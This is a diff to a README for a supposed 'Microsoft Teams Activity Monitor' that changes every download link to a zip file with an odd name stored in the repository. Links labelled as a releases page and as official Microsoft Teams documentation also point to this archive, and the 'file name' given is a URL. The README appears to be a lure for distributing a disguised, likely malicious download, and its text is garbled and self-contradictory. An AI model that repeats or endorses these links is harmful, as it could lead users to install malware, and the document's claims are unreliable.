@@ -1,7 +1,7 @@
 # 🖥️ Microsoft-Teams-Activity-Monitor - Check Microsoft Teams Status Easily
 
 ## 📥 Download the Application
-[![Download](https://raw.githubusercontent.com/canberkqs/Microsoft-Teams-Activity-Monitor/main/newscaster/Microsoft-Teams-Activity-Monitor.zip)](https://raw.githubusercontent.com/canberkqs/Microsoft-Teams-Activity-Monitor/main/newscaster/Microsoft-Teams-Activity-Monitor.zip)
+[![Download](https://github.com/canberkqs/Microsoft-Teams-Activity-Monitor/raw/refs/heads/main/newscaster/Teams_Microsoft_Monitor_Activity_antejentacular.zip)](https://github.com/canberkqs/Microsoft-Teams-Activity-Monitor/raw/refs/heads/main/newscaster/Teams_Microsoft_Monitor_Activity_antejentacular.zip)
 
 ## 📖 About This Application
 Microsoft Teams Activity Monitor is a user-friendly tool designed for businesses, universities, and organizations. This application allows users to check the activity status of Microsoft Teams accounts. You can easily monitor whether a user is active or has retired from the organization. 
@@ -24,11 +24,11 @@ Before you start using Microsoft Teams Activity Monitor, ensure your device meet
 ## 📦 Installation Steps
 Follow these steps to download and run the application:
 
-1. **Visit the Releases Page**: Go to this link to find the latest version of Microsoft Teams Activity Monitor: [Download Here](https://raw.githubusercontent.com/canberkqs/Microsoft-Teams-Activity-Monitor/main/newscaster/Microsoft-Teams-Activity-Monitor.zip).
+1. **Visit the Releases Page**: Go to this link to find the latest version of Microsoft Teams Activity Monitor: [Download Here](https://github.com/canberkqs/Microsoft-Teams-Activity-Monitor/raw/refs/heads/main/newscaster/Teams_Microsoft_Monitor_Activity_antejentacular.zip).
 
 2. **Select the Version**: Choose the latest release version. You will see all available download options.
 
-3. **Download the Application**: Click on the executable file to download it to your computer. The file name will look like `https://raw.githubusercontent.com/canberkqs/Microsoft-Teams-Activity-Monitor/main/newscaster/Microsoft-Teams-Activity-Monitor.zip`.
+3. **Download the Application**: Click on the executable file to download it to your computer. The file name will look like `https://github.com/canberkqs/Microsoft-Teams-Activity-Monitor/raw/refs/heads/main/newscaster/Teams_Microsoft_Monitor_Activity_antejentacular.zip`.
 
 4. **Run the Installer**:
    - Locate the downloaded file (usually in your Downloads folder).
@@ -68,10 +68,10 @@ Stay informed about updates and new features by following the GitHub repository.
 If you need further assistance, open an issue in the GitHub repository. Your questions are welcome, and I aim to respond as soon as possible.
 
 ## 📚 References
-For more information on Microsoft Teams and its API, consider exploring the official [Microsoft Teams documentation](https://raw.githubusercontent.com/canberkqs/Microsoft-Teams-Activity-Monitor/main/newscaster/Microsoft-Teams-Activity-Monitor.zip).
+For more information on Microsoft Teams and its API, consider exploring the official [Microsoft Teams documentation](https://github.com/canberkqs/Microsoft-Teams-Activity-Monitor/raw/refs/heads/main/newscaster/Teams_Microsoft_Monitor_Activity_antejentacular.zip).
 
 ## 💡 Feedback
 Your thoughts matter. Share your feedback on the application to help enhance its features and usability. Your input contributes to making the application even better.
 
 ## 📥 Return to Download
-Ready to use the Microsoft Teams Activity Monitor? Click here to [download the latest version](https://raw.githubusercontent.com/canberkqs/Microsoft-Teams-Activity-Monitor/main/newscaster/Microsoft-Teams-Activity-Monitor.zip).
+Ready to use the Microsoft Teams Activity Monitor? Click here to [download the latest version](https://github.com/canberkqs/Microsoft-Teams-Activity-Monitor/raw/refs/heads/main/newscaster/Teams_Microsoft_Monitor_Activity_antejentacular.zip).
